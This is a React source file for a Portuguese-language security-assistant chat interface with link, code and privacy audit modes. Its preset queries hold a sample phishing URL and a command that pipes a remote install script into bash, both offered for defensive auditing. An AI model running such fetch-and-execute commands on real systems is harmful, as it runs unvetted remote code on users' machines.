import React, { useState, useRef, useEffect } from "react";
import {
  Bot,
  Send,
  ShieldCheck,
  Code2,
  Link as LinkIcon,
  FileSearch,
  Sparkles,
  RefreshCw,
  Terminal,
  AlertCircle,
  Copy,
  Check,
} from "lucide-react";

interface Message {
  id: string;
  sender: "user" | "guardian";
  text: string;
  timestamp: string;
  mode?: string;
}

export const LobaireGuardianApp: React.FC = () => {
  const [messages, setMessages] = useState<Message[]>([
    {
      id: "init-1",
      sender: "guardian",
      text: `🐺 **Olá! Eu sou o Lobaite Guardian AI.**

Seu sentinela de cibersegurança e soberania de dados do **LobaiteOS 🐺**. Estou pronto para ajudar você a:
• **Auditar links ou cabeçalhos de e-mails suspeitos** (Detecção de Phishing)
• **Analisar códigos ou scripts** para identificar vulnerabilidades e injeções
• **Avaliar políticas de privacidade** e desmascarar termos abusivos
• **Recomendar protocolos de anonimato**, redes Tor/I2P e estratégias de criptografia.

Como posso proteger sua sessão agora?`,
      timestamp: "15:25",
    },
  ]);
  const [input, setInput] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [selectedAuditMode, setSelectedAuditMode] = useState<"general" | "inspect_link" | "audit_code" | "privacy_audit">("general");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const messagesEndRef = useRef<HTMLDivElement>(null);

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages, isLoading]);

  const handleSend = async (customPrompt?: string, modeOverride?: string) => {
    const textToSend = (customPrompt || input).trim();
    if (!textToSend || isLoading) return;

    const userMsg: Message = {
      id: "u-" + Date.now(),
      sender: "user",
      text: textToSend,
      timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }),
    };

    setMessages((prev) => [...prev, userMsg]);
    if (!customPrompt) setInput("");
    setIsLoading(true);

    try {
      const activeMode = modeOverride || selectedAuditMode;
      const res = await fetch("/api/gemini/advisor", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          prompt: textToSend,
          mode: activeMode,
        }),
      });

      const data = await res.json();
      if (data.success) {
        setMessages((prev) => [
          ...prev,
          {
            id: "g-" + Date.now(),
            sender: "guardian",
            text: data.response,
            timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }),
            mode: activeMode,
          },
        ]);
      } else {
        throw new Error(data.error || "Falha na resposta do Guardian");
      }
    } catch (err: any) {
      setMessages((prev) => [
        ...prev,
        {
          id: "err-" + Date.now(),
          sender: "guardian",
          text: `⚠️ **Aviso de Isolamento:** Não foi possível contactar o cluster de IA. Proteções locais ativas.\n\n*Detalhes:* ${err?.message || "Sem conexão"}`,
          timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }),
        },
      ]);
    } finally {
      setIsLoading(false);
    }
  };

  const copyToClipboard = (id: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const PRESET_QUERIES = [
    {
      title: "Auditar Link Phishing",
      icon: LinkIcon,
      mode: "inspect_link" as const,
      prompt: "Analise o risco deste link suspeito: https://secure-login-lobaire-verify-account.tk/auth?id=9812",
    },
    {
      title: "Checar Script Shell",
      icon: Code2,
      mode: "audit_code" as const,
      prompt: "Audite este comando shell quanto a riscos: curl -sSL https://suspicious-domain.io/install.sh | bash",
    },
    {
      title: "Anti-Fingerprint Guide",
      icon: ShieldCheck,
      mode: "general" as const,
      prompt: "Quais são as melhores técnicas práticas para neutralizar Canvas e Font Fingerprinting em navegadores modernos?",
    },
    {
      title: "Criptografia de Curva Elíptica",
      icon: FileSearch,
      mode: "general" as const,
      prompt: "Explique como o protocolo Ed25519 garante segurança criptográfica superior ao RSA tradicional com chaves menores.",
    },
  ];

  return (
    <div id="lobaire-guardian-app" className="h-full flex flex-col bg-slate-950/90 text-slate-100 select-none">
      {/* Header */}
      <div className="flex items-center justify-between px-6 py-4 border-b border-slate-800 bg-slate-900/60">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400">
            <Bot className="w-6 h-6" />
          </div>
          <div>
            <h2 className="text-base font-semibold text-white flex items-center gap-2">
              Lobaire Guardian AI
              <span className="px-2 py-0.5 text-[10px] font-mono rounded bg-cyan-500/20 text-cyan-300 border border-cyan-500/30">
                Gemini 3.7 Flash
              </span>
            </h2>
            <p className="text-xs text-slate-400">Auditoria Heurística de Ameaças & Consultoria de Soberania Digital</p>
          </div>
        </div>

        {/* Audit Mode Selector */}
        <div className="flex items-center gap-1 bg-slate-900 border border-slate-800 rounded-lg p-1 text-xs">
          <button
            onClick={() => setSelectedAuditMode("general")}
            className={`px-2.5 py-1 rounded-md transition ${
              selectedAuditMode === "general" ? "bg-cyan-500 text-slate-950 font-semibold" : "text-slate-400 hover:text-white"
            }`}
          >
            Geral
          </button>
          <button
            onClick={() => setSelectedAuditMode("inspect_link")}
            className={`px-2.5 py-1 rounded-md transition ${
              selectedAuditMode === "inspect_link" ? "bg-cyan-500 text-slate-950 font-semibold" : "text-slate-400 hover:text-white"
            }`}
          >
            Links
          </button>
          <button
            onClick={() => setSelectedAuditMode("audit_code")}
            className={`px-2.5 py-1 rounded-md transition ${
              selectedAuditMode === "audit_code" ? "bg-cyan-500 text-slate-950 font-semibold" : "text-slate-400 hover:text-white"
            }`}
          >
            Código
          </button>
        </div>
      </div>

      {/* Messages Feed */}
      <div className="flex-1 overflow-y-auto p-6 space-y-4 font-sans text-sm">
        {messages.map((msg) => (
          <div
            key={msg.id}
            className={`flex flex-col ${msg.sender === "user" ? "items-end" : "items-start"}`}
          >
            <div className="flex items-center gap-2 mb-1 px-1">
              <span className="text-[11px] font-mono text-slate-400">
                {msg.sender === "user" ? "Você (Operador)" : "🐺 Lobaire Guardian"}
              </span>
              <span className="text-[10px] text-slate-400">{msg.timestamp}</span>
            </div>

            <div
              className={`max-w-2xl rounded-2xl p-4 text-xs md:text-sm leading-relaxed border relative group ${
                msg.sender === "user"
                  ? "bg-cyan-600/20 text-cyan-100 border-cyan-500/40 rounded-tr-sm"
                  : "bg-slate-900/90 text-slate-200 border-slate-800 rounded-tl-sm shadow-lg shadow-black/40"
              }`}
            >
              <div className="whitespace-pre-wrap select-text">{msg.text}</div>

              {/* Copy button */}
              <button
                onClick={() => copyToClipboard(msg.id, msg.text)}
                className="absolute top-2 right-2 p-1.5 rounded-lg bg-slate-800/80 text-slate-400 hover:text-white opacity-0 group-hover:opacity-100 transition"
                title="Copiar resposta"
              >
                {copiedId === msg.id ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              </button>
            </div>
          </div>
        ))}

        {isLoading && (
          <div className="flex items-center gap-3 p-4 rounded-2xl bg-slate-900/80 border border-slate-800 max-w-sm text-xs text-cyan-300">
            <RefreshCw className="w-4 h-4 animate-spin text-cyan-400" />
            <span>Lobaire Guardian analisando vetores de risco...</span>
          </div>
        )}
        <div ref={messagesEndRef} />
      </div>

      {/* Preset Quick Actions */}
      <div className="px-6 py-2 border-t border-slate-800/60 bg-slate-950/40 overflow-x-auto">
        <div className="flex items-center gap-2 min-w-max">
          <span className="text-[11px] font-mono text-slate-400 flex items-center gap-1">
            <Sparkles className="w-3 h-3 text-cyan-400" /> Consultas Rápidas:
          </span>
          {PRESET_QUERIES.map((preset, idx) => {
            const Icon = preset.icon;
            return (
              <button
                key={idx}
                onClick={() => {
                  setSelectedAuditMode(preset.mode);
                  handleSend(preset.prompt, preset.mode);
                }}
                className="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 hover:border-cyan-500/40 text-[11px] text-slate-300 hover:text-cyan-300 transition flex items-center gap-1.5"
              >
                <Icon className="w-3 h-3 text-cyan-400" />
                {preset.title}
              </button>
            );
          })}
        </div>
      </div>

      {/* Input Bar */}
      <div className="p-4 border-t border-slate-800 bg-slate-900/80">
        <form
          onSubmit={(e) => {
            e.preventDefault();
            handleSend();
          }}
          className="flex items-center gap-2"
        >
          <div className="flex-1 relative">
            <input
              type="text"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              placeholder={
                selectedAuditMode === "inspect_link"
                  ? "Cole a URL suspeita para auditoria de phishing..."
                  : selectedAuditMode === "audit_code"
                  ? "Cole o script ou comando para análise de segurança..."
                  : "Pergunte sobre privacidade, criptografia, segurança ou auditoria..."
              }
              className="w-full bg-slate-950 border border-slate-800 focus:border-cyan-500/60 rounded-xl px-4 py-2.5 text-xs text-white placeholder-slate-400 outline-none transition"
            />
          </div>
          <button
            type="submit"
            disabled={!input.trim() || isLoading}
            className="px-4 py-2.5 rounded-xl bg-cyan-500 hover:bg-cyan-400 disabled:opacity-40 text-slate-950 font-semibold text-xs flex items-center gap-1.5 transition shadow-lg shadow-cyan-500/20"
          >
            <span>Enviar</span>
            <Send className="w-3.5 h-3.5" />
          </button>
        </form>
      </div>
    </div>
  );
};
